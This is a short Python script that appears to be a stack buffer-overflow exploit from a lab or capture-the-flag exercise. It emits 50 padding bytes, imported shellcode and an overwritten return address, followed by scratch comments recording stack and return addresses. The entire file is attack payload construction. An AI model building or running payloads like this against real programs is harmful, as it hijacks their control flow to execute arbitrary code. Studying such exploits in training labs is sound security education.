#!/usr/bin/env python3

import sys

from shellcode import shellcode
#sys.stdout.buffer.write(shellcode)

sys.stdout.buffer.write(b'A'*50+shellcode+0x0000000000401e6c.to_bytes(8,"little"))

# ret: 0x0000000000401e0f

#0x7ffffffed510
#140737488278800
#return addr: 0x0000000000401e0f

#0x7, 7
# start of shellcode: 0x7ffffff6d4b0

#0x7ffffffed510
#140737488278800

#0x7, 7